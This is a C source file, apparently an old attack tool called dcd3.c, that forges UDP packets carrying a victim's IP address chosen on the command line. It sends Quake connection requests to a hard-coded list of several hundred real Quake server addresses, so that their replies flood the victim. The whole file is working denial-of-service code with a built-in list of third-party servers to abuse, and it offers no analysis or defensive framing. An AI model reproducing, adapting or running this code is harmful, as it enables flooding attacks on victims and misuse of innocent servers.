/*
   dcd3.c [Idea/Code by Volatile]

   Format for server file: IP:PORT:TYPE

   IP   - IP of the Quake server
   PORT - Port that the Quake server listens on
   TYPE - 0 (Always use 0)
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <sys/uio.h>
#include <unistd.h>

char conn_pack0[] = { -128,0,0,12,1,81,85,65,75,69,0,3 };
char conn_pack1[] = { -1,-1,-1,-1,99,111,110,110,101,99,116,32,34,92,110,111,
                      97,105,109,92,48,92,109,115,103,92,49,92,114,97,116,
                      101,92,50,53,48,48,92,98,111,116,116,111,109,99,111,
                      108,111,114,92,49,98,92,116,111,112,99,111,108,111,114,
                      92,110,97,109,101,92,83,110,111,111,112,121,34,10 };

#define PS0 20+8+12
#define PS1 20+8+strlen(conn_pack1)

char *servers[] = {
"129.15.3.38:26000:0",
"207.123.126.4:26000:0",
"129.15.3.38:26001:0",
"129.15.3.38:26002:0",
"192.107.41.7:26000:0",
"157.182.246.58:26000:0",
"128.52.42.22:26000:0",
"209.51.213.12:26000:0",
"209.112.14.200:26000:0",
"144.92.218.112:26000:0",
"200.239.253.14:26000:0",
"146.227.105.5:26000:0",
"209.12.13.20:26000:0",
"134.147.141.98:26000:0",
"137.48.127.127:26000:0",
"209.51.192.228:26000:0",
"151.201.64.194:26000:0",
"199.247.126.24:26000:0",
"206.171.181.3:26000:0",
"159.134.244.134:26000:0",
"207.229.129.193:26000:0",
"194.125.2.219:26001:0",
"206.98.138.162:26000:0",
"134.193.111.241:26000:0",
"207.40.196.13:26000:0",
"209.26.6.121:26000:0",
"208.194.67.16:26000:0",
"205.163.58.20:26000:0",
"199.247.156.6:26000:0",
"159.134.244.132:26000:0",
"208.18.129.2:26000:0",
"208.0.188.6:26000:0",
"208.137.128.24:26000:0",
"198.106.23.1:26000:0",
"207.239.192.51:26000:0",
"165.166.140.122:26000:0",
"207.19.125.13:26000:0",
"144.92.229.122:26000:0",
"199.202.71.203:26000:0",
"200.255.244.2:26000:0",
"207.30.184.9:26000:0",
"129.186.121.53:26000:0",
"204.210.15.71:26000:0",
"198.101.39.41:26000:0",
"192.52.220.101:26000:0",
"194.126.80.142:26000:0",
"206.171.181.1:26000:0",
"208.4.5.9:26000:0",
"206.246.194.16:26000:0",
"205.139.62.15:26000:0",
"204.254.98.15:26000:0",
"207.206.116.41:26000:0",
"208.130.10.26:26000:0",
"207.126.70.69:26000:0",
"38.241.229.103:26000:0",
"204.170.191.6:26000:0",
"144.92.243.243:26000:0",
"144.92.111.117:26000:0",
"194.229.103.195:26000:0",
"208.134.73.42:26000:0",
"207.64.79.1:26000:0",
"171.64.65.70:26004:0",
"207.13.110.4:26000:0",
"204.253.208.245:26000:0",
"165.166.144.45:26000:0",
"128.252.22.47:26000:0",
"204.210.15.71:26001:0",
"193.88.50.50:26000:0",
"209.155.24.25:26000:0",
"204.49.131.19:26000:0",
"199.67.51.102:26000:0",
"207.114.144.200:26000:0",
"165.166.140.140:26000:0",
"38.233.80.136:26000:0",
"204.216.57.249:26000:0",
"199.72.175.4:26000:0",
"204.91.237.250:26000:0",
"206.191.0.209:26000:0",
"194.109.6.220:26000:0",
"207.67.188.25:26000:0",
"160.45.32.176:26000:0",
"206.246.194.15:26000:0",
"207.65.182.12:26000:0",
"204.213.176.8:26000:0",
"207.99.85.67:26000:0",
"209.172.129.66:26000:0",
"132.230.63.23:26000:0",
"206.149.144.14:26000:0",
"147.188.209.113:26000:0",
"204.141.86.42:26000:0",
"207.8.164.27:26000:0",
"204.254.98.11:26000:0",
"204.216.126.251:26000:0",
"207.206.65.5:26000:0",
"209.12.170.11:26000:0",
"131.111.226.98:26000:0",
"194.65.5.103:26000:0",
"204.202.54.95:26000:0",
"204.97.179.4:26000:0",
"24.0.147.54:26000:0",
"207.170.48.24:26000:0",
"199.217.218.8:26000:0",
"207.166.192.85:26000:0",
"206.154.148.145:26000:0",
"206.248.16.16:26000:0",
"200.241.188.3:26000:0",
"204.177.71.10:26000:0",
"140.233.207.207:26000:0",
"207.218.51.13:26000:0",
"194.109.6.217:26000:0",
"207.236.41.30:26000:0",
"195.162.196.42:26000:0",
"209.49.51.98:26020:0",
"198.106.166.188:26000:0",
"207.239.212.113:26000:0",
"165.91.3.91:26000:0",
"128.95.25.184:26666:0",
"128.2.237.78:26001:0",
"128.2.237.78:26003:0",
"207.254.73.2:26000:0",
"208.225.207.3:26666:0",
"171.64.65.70:26666:0",
"208.225.207.3:26001:0",
"128.2.237.78:26000:0",
"129.21.113.71:26000:0",
"195.74.96.45:26000:0",
"206.129.112.27:26000:0",
"199.67.51.101:26000:0",
"38.156.101.2:26000:0",
"204.177.39.44:26000:0",
"207.173.16.53:26000:0",
"207.175.30.130:26123:0",
"128.52.38.15:26000:0",
"204.49.131.19:26666:0",
"129.21.114.129:26666:0",
"128.2.237.78:26002:0",
"18.238.0.24:26001:0",
"140.247.155.208:26000:0",
"208.137.139.8:26000:0",
"141.219.81.85:26000:0",
"208.203.244.13:26000:0",
"208.137.128.24:26020:0",
"140.180.143.197:26666:0",
"205.189.151.3:26000:0",
"199.247.126.23:26000:0",
"18.238.0.24:26002:0",
"206.98.138.166:26000:0",
"128.2.74.204:26000:0",
"198.87.96.254:26000:0",
"204.209.212.5:26000:0",
"207.171.0.68:26002:0",
"159.134.244.133:26000:0",
"195.170.128.5:26000:0",
"198.164.230.15:26000:0",
"130.236.249.227:26000:0",
"193.88.50.50:26001:0",
"143.44.100.20:26000:0",
"129.15.3.39:26000:0",
"205.219.23.3:26000:0",
"205.177.27.190:26000:0",
"207.172.7.66:26000:0",
"209.144.56.16:26000:0",
"128.164.141.5:26000:0",
"129.2.237.36:26000:0",
"206.98.138.165:26000:0",
"194.100.105.71:26000:0",
"194.158.161.28:26000:0",
"203.87.2.13:26000:0",
"141.219.83.69:26000:0",
"198.83.6.70:26000:0",
"35.8.144.96:26000:0",
"206.196.57.130:26000:0",
"206.31.102.16:26000:0",
"207.23.43.3:26000:0",
"207.18.86.50:26000:0",
"207.87.203.20:26000:0",
"198.161.102.213:26000:0",
"24.1.226.74:26000:0",
"207.207.32.130:26000:0",
"165.166.140.160:26000:0",
"204.248.210.20:26000:0",
"207.87.203.28:26000:0",
"165.166.140.111:26000:0",
"24.3.132.9:26000:0",
"205.217.206.189:26000:0",
"207.99.85.69:26000:0",
"192.124.43.75:26000:0",
"199.72.175.156:26000:0",
"209.98.3.217:26000:0",
"206.154.138.8:26000:0",
"205.199.137.12:26000:0",
"204.177.184.31:26000:0",
"192.124.43.73:26000:0",
"171.64.65.70:26000:0",
"165.91.21.113:26000:0",
"198.17.249.14:26000:0",
"156.46.147.17:26000:0",
"207.13.5.18:26000:0",
"208.212.201.9:26000:0",
"207.96.243.5:26000:0",
"206.196.153.201:26000:0",
"204.171.58.6:26000:0",
"140.180.143.197:26000:0",
"207.3.64.52:26000:0",
"207.65.218.15:26000:0",
"194.42.225.247:26000:0",
"205.228.248.27:26000:0",
"204.216.126.250:26000:0",
"128.230.33.90:26000:0",
"128.163.161.105:26000:0",
"208.0.122.12:26000:0",
"206.53.116.243:26000:0",
"199.76.206.54:26000:0",
"194.239.134.18:26000:0",
"208.153.58.17:26000:0",
"206.147.58.45:26000:0",
"204.220.36.31:26000:0",
"207.239.212.107:26000:0",
"206.230.18.20:26000:0",
"195.18.128.10:26000:0",
"151.198.193.6:26000:0",
"208.0.122.11:26000:0",
"206.149.80.99:26000:0",
"207.239.212.244:26000:0",
"129.128.54.168:26000:0",
"194.229.154.41:26000:0",
"207.51.86.22:26000:0",
"207.201.91.8:26000:0",
"205.216.83.5:26000:0",
"208.201.224.211:26000:0",
"194.144.237.50:26000:0",
"147.83.61.32:26000:0",
"136.201.40.50:26000:0",
"132.235.197.72:26000:0",
"195.173.25.34:26000:0",
"194.143.8.153:26000:0",
"194.109.6.218:26000:0",
"18.238.0.24:26000:0",
"129.21.112.194:26000:0",
"128.253.185.87:26000:0",
"206.183.143.4:26000:0",
"130.234.16.21:26000:0",
"148.202.1.5:26000:0",
"167.114.26.50:26000:0",
"169.197.1.154:26000:0",
"207.0.164.8:26000:0",
"207.243.123.2:26000:0",
"207.106.42.14:26000:0",
"198.161.102.18:26000:0",
"202.218.50.24:26000:0",
"205.139.35.22:26000:0",
"193.74.114.41:26000:0",
"199.217.218.008:26000:0",
"129.15.3.37:26000:0",
"130.240.195.72:26000:0",
"205.164.220.20:26000:0",
"209.90.128.16:26000:0",
"200.241.222.88:26000:0",
"194.213.72.22:26000:0",
"206.112.1.31:26000:0",
"132.230.153.50:26000:0",
"206.251.130.20:26000:0",
"195.238.2.30:26000:0",
"193.164.183.3:26000:0",
"150.156.210.232:26000:0",
"193.13.231.151:26000:0",
"200.18.178.7:26000:0",
"206.20.111.7:26000:0",
"192.89.182.26:26000:0",
"207.53.96.12:26000:0",
"194.64.176.5:26000:0",
"203.19.214.28:26000:0",
"130.241.142.10:26000:0",
"207.48.50.10:26000:0",
"129.13.209.22:26000:0",
"194.243.65.2:26000:0",
"194.19.128.13:26000:0",
"202.27.184.4:26000:0",
"194.204.5.25:26000:0",
"200.241.93.2:26000:0",
"194.125.148.2:26000:0",
"130.237.233.111:26000:0",
"139.174.248.165:26000:0",
"207.78.244.40:26000:0",
"195.74.0.69:26000:0",
"203.55.240.1:26000:0",
"203.61.156.162:26000:0",
"203.61.156.164:26000:0",
"195.90.193.138:26000:0",
"195.94.179.5:26000:0",
"203.23.237.110:26000:0",
"200.18.178.14:26000:0",
"200.248.241.1:26000:0",
"203.17.103.34:26000:0",
"131.151.52.105:26000:0",
"200.250.234.39:26000:0",
"203.29.160.21:26000:0",
"206.41.136.94:26000:0",
"202.49.244.17:26000:0",
"196.25.1.132:26000:0",
"206.230.102.9:26000:0",
"206.25.117.125:26000:0",
"200.246.5.28:26000:0",
"200.255.96.24:26000:0",
"195.94.179.25:26000:0",
"195.224.47.44:26000:0",
"200.248.241.2:26000:0",
"203.15.24.46:26000:0",
"199.217.218.7:26000:0",
"200.246.248.9:26000:0",
"200.246.227.44:26000:0",
"202.188.101.246:26000:0",
"207.212.176.26:26000:0",
"200.255.218.41:26000:0",
"200.246.0.248:26000:0",
"209.29.65.3:26000:0",
"203.32.8.197:26000:0",
"200.248.149.31:26000:0",
"200.246.52.4:26000:0",
"203.17.23.13:26000:0",
"206.196.57.130:26001:0",
"130.63.74.16:26000:0",
"203.16.135.34:26000:0",
"195.66.200.101:26000:0",
"199.217.218.007:26000:0",
"203.30.239.5:26000:0",
"128.206.92.47:26000:0",
"203.17.23.9:26000:0",
"205.139.59.121:26000:0",
"136.159.102.88:26000:0",
"207.152.95.9:26000:0",
"205.197.242.62:26000:0",
"204.119.24.237:26000:0",
"200.246.163.6:26000:0",
"206.96.251.44:26000:0",
"203.61.156.165:26000:0",
"207.0.129.183:26000:0",
"194.117.157.74:26000:0",
"206.83.174.10:26000:0",
"204.171.44.26:26000:0",
"204.216.27.8:26000:0",
"148.217.2.200:26000:0",
"193.13.231.149:26000:0",
"204.157.39.7:26000:0",
"208.194.67.16:26012:0",
"137.123.210.80:26000:0",
"149.106.37.197:26000:0",
"207.207.248.20:26000:0",
"143.195.150.40:26000:0",
"204.90.102.49:26000:0",
"209.48.89.1:26000:0",
"130.126.195.94:26000:0",
"134.193.111.241:26500:0",
"205.218.60.98:26001:0",
"205.218.60.98:26000:0",
"165.91.20.158:26000:0",
"206.248.16.16:26001:0",
"206.248.16.16:26002:0",
"149.156.159.100:26000:0",
"163.1.138.204:26000:0",
"204.177.71.250:26000:0",
"207.25.220.40:26000:0",
"206.25.206.10:26000:0",
"206.186.72.103:26000:0",
"206.154.216.100:26000:0",
"204.253.208.225:26000:0",
"203.59.24.229:26000:0",
"200.255.216.11:26000:0",
"128.143.244.38:26000:0",
"128.113.161.123:26000:0",
"128.138.149.62:26000:0",
"128.175.46.96:26000:0",
"204.210.15.62:26000:0",
"204.210.15.62:26001:0",
"206.83.174.9:26000:0",
NULL
};

int i, s, fl, ret;
unsigned int sp, dp;
struct in_addr src, dst;
struct sockaddr_in addr;
char pack[1024];
struct ip *iph;
struct udphdr *udph;

int read_data(void);
int parse_in(char *);
int addserv(char *, unsigned int, char);

void main(int argc, char *argv[])
{

  iph = (struct ip *)pack;
  udph = (struct udphdr *)(iph + 1);
  if (argc < 2) {
     printf("Usage: %s <ip>\n", argv[0]);
     exit(-1);
  }

  printf("Sending packets...\n");

  src.s_addr = inet_addr(argv[1]);
  if (src.s_addr == -1) {
     printf("Invalid source IP: %s\n", argv[1]);
     exit(-1);
  }

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1) {
     perror("socket");
     exit(-1);
  }

  fl = 1;
  ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, &fl, sizeof(int));
  if (ret == -1) {
     perror("setsockopt");
     exit(-1);
  }

  bzero((char *)&addr, sizeof(addr));
  addr.sin_family = AF_INET;
  read_data();
  printf("p0ink.\n");
}

int parse_in(char *in)
{
  int i, n, c, m, ret;
  char ip[16], tmp[6], mode, tmp2;
  unsigned int port;

  bzero(ip, 16); bzero(tmp, 6); mode = 0; port = 0; n = 0; c = 0; m = 0;
  tmp2 = 0;
  for (i = 0; i < strlen(in); i++) {
      if (in[i] != ' ') {
         if (in[i] != ':') {
            if (m == 0) {
               ip[c] = in[i];
               c++;
            }
            if (m == 1) {
               tmp[c] = in[i];
               c++;
            }
            if (m == 2) {
               tmp2 = in[i];
               break;
            }
         }
         else {
           m++; c = 0;
         }
      }
  }

  port = (unsigned int)atoi(tmp);
  mode = (tmp2 - 48);

  addserv(ip, port, mode);

  return ret;
}

int read_data(void)
{
  int i;
  char in[1024];

  for (i = 0; i < 32767; i++) {
      if (servers[i] == NULL)
         break;
      parse_in(servers[i]);
  }
  return 1;
}

int addserv(char *ip, unsigned int port, char mode)
{
    bzero(pack, 1024);
    dp = port;

    iph->ip_v = IPVERSION;
    iph->ip_hl = sizeof *iph >> 2;
    iph->ip_tos = 0;
    iph->ip_ttl = 40;
#ifdef BSD
    if (mode == 0)
       iph->ip_len = PS0;
    else
       iph->ip_len = PS1;
#else
    if (mode == 0)
       iph->ip_len = htons(PS0);
    else
       iph->ip_len = htons(PS1);
#endif
    iph->ip_p = IPPROTO_UDP;
    iph->ip_src = src;

    dst.s_addr = inet_addr(ip);
    if (dst.s_addr == -1) {
       printf("Invalid destination IP: %s\n", ip);
    }

    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = dst.s_addr;
    iph->ip_dst = dst;

#ifdef BSD
    udph->uh_dport = htons(dp);
    if (mode == 0) {
       udph->uh_ulen  = htons(sizeof *udph + 12);
       udph->uh_sport = htons(rand());
    }
    else {
       udph->uh_ulen  = htons(sizeof *udph + strlen(conn_pack1));
       udph->uh_sport = htons(27001);
    }
#else
    udph->dest   = htons(dp);
    if (mode == 0) {
       udph->len  = htons(sizeof *udph + 12);
       udph->source = htons(rand());
    }
    else {
       udph->len  = htons(sizeof *udph + strlen(conn_pack1));
       udph->source = htons(27001);
    }
#endif

    if (mode == 0) {
       memcpy(udph + 1, conn_pack0, 12);
       ret = sendto(s, pack, PS0, 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    else {
       memcpy(udph + 1, conn_pack1, strlen(conn_pack1));
       ret = sendto(s, pack, PS1, 0, (struct sockaddr *)&addr, sizeof(addr));
    }

    if (ret == -1) {
       perror("sendto");
       exit(-1);
    }
 }
